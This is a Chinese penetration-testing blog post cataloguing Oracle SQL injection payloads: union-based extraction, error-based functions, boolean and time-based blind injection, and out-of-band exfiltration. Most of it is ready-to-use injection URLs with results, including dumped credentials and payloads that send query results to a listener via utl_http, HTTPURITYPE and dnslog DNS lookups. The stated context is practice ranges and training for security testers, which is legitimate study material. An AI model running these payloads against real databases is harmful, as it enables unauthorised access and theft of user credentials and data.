---
title: Oracle数据库注入全方位利用总结(渗透必备)
tags: 
  - 数据库
  - SQL注入
  - oracle
categories: web安全
keywords: '数据库,web安全,oracle,sql注入'
description: Oracle数据库注入全方位利用总结(渗透必备)
cover: /images/oracle.png
date: 2021-02-02 10:45:41
---

<meta name="referrer" content="no-referrer"/>

> 本文已发布到先知社区：https://xz.aliyun.com/t/9940
>
> 作者：ajie

# 0x01 前言

在渗透测试过程中，总是遇到不熟悉的数据库，知道了有SQL注入漏洞但是无法利用，这总让我很苦恼。因为网上的文章很多都是基于Mysql数据库的，当遇到Oracle数据库时有些数据库层面的不同点对于我们测试总会有点困扰，无法成功利用。故学习了Oracle数据库注入的相关知识，在此总结分享给大家，希望能够对安全从业人员有所帮助。
全文基于对于SQL注入具有一定理解，并且能够在Mysql数据库进行注入的基础上进行阐述。本文旨在讲述Oracle数据库多种情况下如何进行注入，注重实战，相关概念问题请自行查阅资料，谢谢理解～

# 0x02 注入点确定
跟其他数据库一样，检测注入点都是可以通过拼接and语句进行判断。这里通过and 1=1 和and 1=2进行判断。实战中还可以通过延时函数进行判断。
```
http://219.153.49.228:43469/new_list.php?id=1%20and%201=1
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353232047-3c17c5db-589b-4002-a82a-6fbe01e576fe.png#align=left&display=inline&height=439&margin=%5Bobject%2Object%5D&name=image.png&originHeight=878&originWidth=1608&size=122915&status=done&style=none&width=804)
```
http://219.153.49.228:43469/new_list.php?id=1%20and%201=2
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353242702-ec873de8-7a5e-4bf6-b14f-3768ee4e8e76.png#align=left&display=inline&height=278&margin=%5Bobject%2Object%5D&name=image.png&originHeight=556&originWidth=1578&size=35308&status=done&style=none&width=789)
# 0x03 显错注入
## 1、判断字段数为2
与其他注入一样，这里通过order by来判断字段数。因为order by 2页面正常，order by 3页面不正常，故判断当前字段数为2。
```
http://219.153.49.228:43469/new_list.php?id=1%20order%20by%202
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353279684-e0cc78c5-4353-4770-82e2-44b3b6176214.png#align=left&display=inline&height=420&margin=%5Bobject%2Object%5D&name=image.png&originHeight=840&originWidth=1458&size=116992&status=done&style=none&width=729)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353306166-7c477672-384f-4899-ab58-d487f859a22d.png#align=left&display=inline&height=220&margin=%5Bobject%2Object%5D&name=image.png&originHeight=440&originWidth=1412&size=29793&status=done&style=none&width=706)
## 2、获取显错点
联合查询这里使用了union select，oracle数据库与mysql数据库不同点在于它对于字段点数据类型敏感，也就是说我们不能直接union select 1,2,3来获取显错点了，需要在字符型字段使用字符型数据，整型字段使用整型数据才可以。如下，两个字段都为字符型，故使用union select 'null','null'。
(在有些情况下也采用union all select的形式进行联合查询。union all select与union select的不同点可以很容易理解为all表示输出所有，也就是当数据出现相同时，将所有数据都输出；union select则会将相同数据进行过滤，只输出其中一条。)
```
#联合查询
http://219.153.49.228:43469/new_list.php?id=-1 union select null,null from dual
#修改null为'null'，判断字段类型均为字符型
http://219.153.49.228:43469/new_list.php?id=-1 union select 'null','null' from dual
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353537650-e294e0ca-44d5-4884-9341-27dd41eff277.png#align=left&display=inline&height=500&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1000&originWidth=2526&size=171188&status=done&style=none&width=1263)
后续便可以替换显错点进行注入。
## 3、查询数据库版本信息
```
http://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select banner from sys.v_$version where rownum=1) from dual
```
## 4、获取当前数据库连接用户
```
http://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select sys_context('userenv','current_user') from dual) from dual

http://219.153.49.228:44768/new_list.php?id=-1 union select '1',user from dual
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354142760-9af3da8c-9eb3-4592-9c52-24a10e962061.png#align=left&display=inline&height=347&margin=%5Bobject%2Object%5D&name=image.png&originHeight=694&originWidth=2492&size=123811&status=done&style=none&width=1246)
## 5、查询当前数据库库名
```
http://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select instance_name from V$INSTANCE) from dual
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354254697-9084c0a1-02ea-4da6-8f68-b579e31135fd.png#align=left&display=inline&height=338&margin=%5Bobject%2Object%5D&name=image.png&originHeight=676&originWidth=2510&size=123816&status=done&style=none&width=1255)
## 6、查询数据库表名
查询表名一般查询admin或者user表
### 直接查询
获取第一个表名**LOGMNR_SESSION_EVOLVE$**
```
http://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select table_name from user_tables where rownum=1) from dual
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353844960-cad323f3-f77c-4c12-b1e8-9250896245b8.png#align=left&display=inline&height=254&margin=%5Bobject%2Object%5D&name=image.png&originHeight=508&originWidth=1252&size=21553&status=done&style=none&width=626)
获取第二个表名**LOGMNR_GLOBAL$**
```
http://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select table_name from user_tables where rownum=1 and table_name not in 'LOGMNR_SESSION_EVOLVE$') from dual
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353863561-54f3d94e-8596-40c9-9f49-d2520256d80f.png#align=left&display=inline&height=238&margin=%5Bobject%2Object%5D&name=image.png&originHeight=476&originWidth=1166&size=18009&status=done&style=none&width=583)
获取第三个表名**LOGMNR_GT_TAB_INCLUDE$**
```
http://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select table_name from user_tables where rownum=1 and table_name not in 'LOGMNR_SESSION_EVOLVE$' and table_name not in 'LOGMNR_GLOBAL$') from dual
```
### 模糊搜索查询
获取sns_users表名
```
http://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select table_name from user_tables where table_name like '%user%' and rownum=1) from dual
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354561532-baf25308-92eb-42f2-bc57-e95ddd2b1891.png#align=left&display=inline&height=346&margin=%5Bobject%2Object%5D&name=image.png&originHeight=692&originWidth=2496&size=125987&status=done&style=none&width=1248)
## 7、查询数据库列名
### 直接查询
获取sns_users表里的字段
```
http://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where table_name='sns_users' and rownum=1) from dual

http://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where rownum=1 and column_name not in 'USER_NAME') from dual

http://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where rownum=1 and column_name not in 'USER_NAME' and column_name not in 'AGENT_NAME') from dual

……………

http://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where rownum=1 and column_name not in 'USER_NAME' and column_name not in 'AGENT_NAME' and column_name not in 'PROTOCOL' and column_name not in 'SPARE1' and column_name not in 'DB_USERNAME' and column_name not in 'OID' and column_name <> 'EVENTID' and column_name <> 'NAME' and column_name <> 'TABLE_OBJNO') from dual
```
```
获取如下字段：
USER_NAME
AGENT_NAME
PROTOCOL
SPARE1
DB_USERNAME
OID
EVENTID
NAME
TABLE_OBJNO
USAGE
USER_PWD
…………
```
### 模糊搜索查询
```
http://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where table_name='sns_users' and rownum=1 and column_name like '%USER%') from dual

http://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where table_name='sns_users' and rownum=1 and column_name like '%USER%' and column_name <> 'USER_NAME') from dual
```
## 8、查询数据库数据
获取账号密码字段内容
```
http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from "sns_users" where rownum=1
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355758027-eb920ce1-1667-40c4-9703-bf055011ce09.png#align=left&display=inline&height=332&margin=%5Bobject%2Object%5D&name=image.png&originHeight=664&originWidth=2436&size=124453&status=done&style=none&width=1218)


```
http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from "sns_users" where rownum=1 and USER_NAME <> 'zhong'
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355803061-53c045a9-600d-4231-911b-a0b145fd8d32.png#align=left&display=inline&height=308&margin=%5Bobject%2Object%5D&name=image.png&originHeight=616&originWidth=2470&size=127349&status=done&style=none&width=1235)
```
http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from "sns_users" where rownum=1 and USER_NAME <> 'zhong' and USER_NAME not in 'hu'
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355829407-d770aa94-c339-4686-8131-9c5b9910039e.png#align=left&display=inline&height=288&margin=%5Bobject%2Object%5D&name=image.png&originHeight=576&originWidth=2436&size=121972&status=done&style=none&width=1218)
解密获取密码392118
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355905460-f2485164-b4a8-4419-a99f-9752107804b7.png#align=left&display=inline&height=390&margin=%5Bobject%2Object%5D&name=image.png&originHeight=780&originWidth=1526&size=108851&status=done&style=none&width=763)


## 9、美化输出
Oracle采用||进行数据连接
```
http://219.153.49.228:44768/new_list.php?id=-1 union select '用户名：'||USER_NAME,'密码：'||USER_PWD from "sns_users" where rownum=1
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627356270321-022d9ac4-944b-4251-9f20-fa13afadd1b9.png#align=left&display=inline&height=281&margin=%5Bobject%2Object%5D&name=image.png&originHeight=562&originWidth=2512&size=124098&status=done&style=none&width=1256)
# 0x04 报错注入
报错注入是一种通过函数报错前进行子查询获取数据，再通过错误页面回显的一种注入手法，下面介绍几种报错注入函数以及获取一些常见的获取数据，实际操作只需要将子查询内的查询语句进行替换即可。
## 1、ctxsys.drithsx.sn()
```
#获取当前数据库用户 ORACLE1
?id=1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370671892-ba68c50c-4b25-48c6-8121-2ee170485de9.png#align=left&display=inline&height=357&margin=%5Bobject%2Object%5D&name=image.png&originHeight=714&originWidth=2512&size=177516&status=done&style=none&width=1256)
```
#获取数据库版本信息
?id=1 and 1=ctxsys.drithsx.sn(1,(select banner from sys.v_$version where rownum=1)) --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370745612-670ae342-fb32-42ff-8b48-bd894e0b6d3f.png#align=left&display=inline&height=341&margin=%5Bobject%2Object%5D&name=image.png&originHeight=682&originWidth=2492&size=195982&status=done&style=none&width=1246)
## 2、XMLType()
```
?id=1 and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464280011-c070c8c1-5831-4516-93a5-d9de8e4728b2.png#align=left&display=inline&height=466&margin=%5Bobject%2Object%5D&name=image.png&originHeight=932&originWidth=1860&size=83611&status=done&style=none&width=930)
## 3、dbms_xdb_version.checkin()
```
#获取数据库版本信息
?id=1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) from dual) is not null --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370853172-60c1003a-f2bc-45e7-88e4-e1dc5b544009.png#align=left&display=inline&height=352&margin=%5Bobject%2Object%5D&name=image.png&originHeight=704&originWidth=2466&size=181678&status=done&style=none&width=1233)
## 4、bms_xdb_version.makeversioned()
```
#获取当前数据库用户 ORACLE1
?id=1 and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371068298-bf405b32-0774-4999-b59c-5f972ff993eb.png#align=left&display=inline&height=299&margin=%5Bobject%2Object%5D&name=image.png&originHeight=598&originWidth=2500&size=157266&status=done&style=none&width=1250)
## 5、dbms_xdb_version.uncheckout()
```
#获取数据库版本信息
?id=1 and (select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual) is not null --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371151615-1dc8551d-bb05-4b01-ab12-fb20b684f7b1.png#align=left&display=inline&height=305&margin=%5Bobject%2Object%5D&name=image.png&originHeight=610&originWidth=2464&size=184586&status=done&style=none&width=1232)
## 6、dbms_utility.sqlid_to_sqlhash()
```
#获取数据库版本信息
?id=1 and (SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual) is not null --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371240951-badc7016-575d-4a23-9d5b-24d99923c150.png#align=left&display=inline&height=306&margin=%5Bobject%2Object%5D&name=image.png&originHeight=612&originWidth=2500&size=190889&status=done&style=none&width=1250)
## 7、ordsys.ord_dicom.getmappingxpath()
```
?id=1 and 1=ordsys.ord_dicom.getmappingxpath((select banner from sys.v_$version where rownum=1),user,user)--
```
## 8、utl_inaddr.*()
utl_inaddr（用于取得局域网或Internet环境中的主机名和IP地址）
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627369182388-db5976e4-c62c-460c-a76e-4a3b9fdadf0e.png#align=left&display=inline&height=444&margin=%5Bobject%2Object%5D&name=image.png&originHeight=888&originWidth=1480&size=138926&status=done&style=none&width=740)
```
?id=1 and 1=utl_inaddr.get_host_name((select user from dual)) --
?id=1 and 1=utl_inaddr.get_host_address((select user from dual)) --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464133762-13bb4b59-3f8f-466a-b970-082352b0484e.png#align=left&display=inline&height=398&margin=%5Bobject%2Object%5D&name=image.png&originHeight=796&originWidth=1692&size=57659&status=done&style=none&width=846)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464181708-702fd815-478b-488f-8c3a-565adb5fb2f4.png#align=left&display=inline&height=458&margin=%5Bobject%2Object%5D&name=image.png&originHeight=916&originWidth=1810&size=65997&status=done&style=none&width=905)
# 0x05 布尔型盲注
常用猜解：
```
#猜长度
?id=1 and 6=(select length(user) from dual)--
#截取值猜ascii码
?id=1 and (select ascii(substr(user,1,1)) from dual)>83
?id=1 and (select ascii(substr(user,1,1)) from dual)=83
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627358275597-570e4d7d-7594-4570-bd79-ff983c61706e.png#align=left&display=inline&height=380&margin=%5Bobject%2Object%5D&name=image.png&originHeight=760&originWidth=2404&size=187790&status=done&style=none&width=1202)
## 1、decode函数布尔盲注
decode(字段或字段的运算，值1，值2，值3）
这个函数运行的结果是，当字段或字段的运算的值等于值1时，该函数返回值2，否则返回3

### 测试用户名长度
```
http://219.153.49.228:44768/new_list.php?id=1 and 6=(select length(user) from dual) --
```
### 测试当前用户是否为SYSTEM
```
#如果是system用户则返回正常，不是则返回不正常
http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(user,'SYSTEM',1,0) from dual) -- 
```
```
#使用substr截断，逐个字段进行猜解
http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(substr(user,1,1),'S',1,0) from dual) -- 
?id=1 and 1=(select decode(substr(user,2,1),'Y',1,0) from dual) -- 
?id=1 and 1=(select decode(substr(user,3,1),'S',1,0) from dual) --
?id=1 and 1=(select decode(substr(user,4,1),'T',1,0) from dual) --
?id=1 and 1=(select decode(substr(user,5,1),'E',1,0) from dual) --
?id=1 and 1=(select decode(substr(user,6,1),'M',1,0) from dual) --

#当然也可以配合ascii码进行猜解
?id=1 and 1=(select decode(ascii(substr(user,1,1)),'83',1,0) from dual) --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627366490187-723fa9dc-c6d7-4858-a429-d98bbe77cab4.png#align=left&display=inline&height=436&margin=%5Bobject%2Object%5D&name=image.png&originHeight=872&originWidth=2424&size=197040&status=done&style=none&width=1212)
## 2、instr函数布尔盲注
instr函数的应用：
```
select instr('abcdefgh','de') position from dual;
#返回结果：4
```
盲注中的应用：
```
http://219.153.49.228:44768/new_list.php?id=1 and 1=(instr((select user from dual),'SYS')) --
?id=1 and 4=(instr((select user from dual),'T')) --
```
# 0x06 延时盲注
## 1、检测漏洞存在
DBMS_PIPE.RECEIVE_MESSAGE函数的作用是从指定管道获取消息。
具体用法为：**DBMS_PIPE.RECEIVE_MESSAGE('pipename',timeout)**
**pipename**为varchar(128)的字符串，用以指定管道名称，在这里我们输入任意值即可。
**timeout**为integer的可选输入参数，用来指定等待时间。
常用payload如下：
```
http://219.153.49.228:44768/new_list.php?id=1 and 1=dbms_pipe.receive_message('o', 10)--
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627365780661-fefb7bcc-e426-4014-8c09-9803fbb76335.png#align=left&display=inline&height=421&margin=%5Bobject%2Object%5D&name=image.png&originHeight=842&originWidth=2528&size=312249&status=done&style=none&width=1264)
如果页面延时10秒返回，即存在注入。
## 2、配合decode函数延时盲注
只需要将延时语句放入decode函数中即可
```
#直接猜解字符
?id=1 and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('o',5),0) from dual) --

#通过ascii猜解字符
?id=1 and 1=(select decode(ascii(substr(user,1,1)),'83',dbms_pipe.receive_message('o',5),0) from dual) --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627366016814-7d8cdee4-c932-4907-87e0-017ae7f6296f.png#align=left&display=inline&height=506&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1012&originWidth=2146&size=293305&status=done&style=none&width=1073)
## 3、使用其他延时查询来判断
如(select count(*) from all_objects) ，因为查询结果需要一定的时间，在无法使用dbms_pipe.receive_message()函数的情况下可以使用这个。具体操作只需要将decode()函数的返回结果进行替换即可。
```
#直接猜解字符
?id=1 and 1=(select decode(substr(user,1,1),'S',(select count(*) from all_objects),0) from dual) --

#通过ascii猜解字符
?id=1 and 1=(select decode(ascii(substr(user,1,1)),'83',(select count(*) from all_objects),0) from dual) --
```
# 0x07 外带数据注入
## 1、url_http.request()
使用此方法，用户需要有utl_http访问网络的权限
首先检测是否支持，页面返回正常则表示支持
```
?id=1 and exists (select count(*) from all_objects where object_name='UTL_HTTP') --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464342525-e4cd81f2-77a8-4a90-ace7-36aa714ccdaa.png#align=left&display=inline&height=369&margin=%5Bobject%2Object%5D&name=image.png&originHeight=738&originWidth=1854&size=42432&status=done&style=none&width=927)
然后python起一个http服务，或者开启nc监听。这里我使用python开启一个服务：
```
python3 -m http.server 4455
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464776325-cd84daca-3f18-48a5-86a3-9a92df1fdd05.png#align=left&display=inline&height=145&margin=%5Bobject%2Object%5D&name=image.png&originHeight=290&originWidth=1144&size=47561&status=done&style=none&width=572)
```
#子查询数据库版本信息并访问python起的http服务
?id=1 and utl_http.request('http://192.168.100.130:4455/'||(select banner from sys.v_$version where rownum=1))=1--

#http访问时可以将||进行URL编码
?id=1 and utl_http.request('http://192.168.100.130:4455/'%7C%7C(select banner from sys.v_$version where rownum=1))=1--
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464897258-175be638-08f8-4355-8ce8-e2552bfdd355.png#align=left&display=inline&height=372&margin=%5Bobject%2Object%5D&name=image.png&originHeight=744&originWidth=1868&size=59899&status=done&style=none&width=934)
可以看到成功获取了数据
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464921197-61542222-97e4-4941-b1d9-ca5bdcec6fe2.png#align=left&display=inline&height=234&margin=%5Bobject%2Object%5D&name=image.png&originHeight=468&originWidth=1454&size=124719&status=done&style=none&width=727)


## 2、utl_inaddr.get_host_address()函数
```
#使用dnslog外带数据
?id=1 and (select utl_inaddr.get_host_address((select user from dual)||'.eeaijt.dnslog.cn') from dual)is not null --
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627465955162-98de91a3-8382-4073-bcf3-18728762e3f1.png#align=left&display=inline&height=343&margin=%5Bobject%2Object%5D&name=image.png&originHeight=686&originWidth=1664&size=42677&status=done&style=none&width=832)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627465968725-e5b0236e-0e8d-4aa2-8556-eb6fbf6e935f.png#align=left&display=inline&height=283&margin=%5Bobject%2Object%5D&name=image.png&originHeight=566&originWidth=1680&size=59996&status=done&style=none&width=840)
## 3、SYS.DBMS_LDAP.INIT()函数
网上说是可以使用，我试着不行，收不到数据，不知道是不是环境问题。
```
?id=1 and (select SYS.DBMS_LDAP.INIT((select user from dual)||'.51prg6.dnslog.cn',80) from dual)is not null --

?id=1 and (select DBMS_LDAP.INIT((select user from dual)||'.51prg6.dnslog.cn',80) from dual)is not null --
```
## 4、HTTPURITYPE()函数
```
?id=1 and (select HTTPURITYPE('http://192.168.100.130:4455/'||(select user from dual)).GETCLOB() FROM DUAL)is not null --
```
同样需要python起一个http服务，或者nc创建监听
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627466748565-80964d64-450b-46fc-8f89-77bdb55ce3cd.png#align=left&display=inline&height=419&margin=%5Bobject%2Object%5D&name=image.png&originHeight=838&originWidth=1878&size=78666&status=done&style=none&width=939)
虽然访问404，但是同样成功外带数据。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627466760517-a4a23a26-b2d0-4ea8-96c9-3a7c5470b395.png#align=left&display=inline&height=230&margin=%5Bobject%2Object%5D&name=image.png&originHeight=460&originWidth=1454&size=97022&status=done&style=none&width=727)
# 0x08 总结
Oracle数据库注入跟日常的注入其实没有什么太大的分别，需要注意数据类型的一致性和常用表名列名的不同即可，在sql注入的原理上都是拼接sql语句并执行。在实战中企业还是有很大部分使用Oracle数据库，故在此进行分析总结，希望能够对渗透测试人员有所帮助。
以上测试靶场采用墨者学院Oracle注入靶场、掌控安全Oralce注入靶场以及本地搭建的Oracle数据库，在实战中可能会遇到waf等安全设备的拦截，后续将针对Oracle数据库waf绕过编写一篇文章，敬请期待ing～
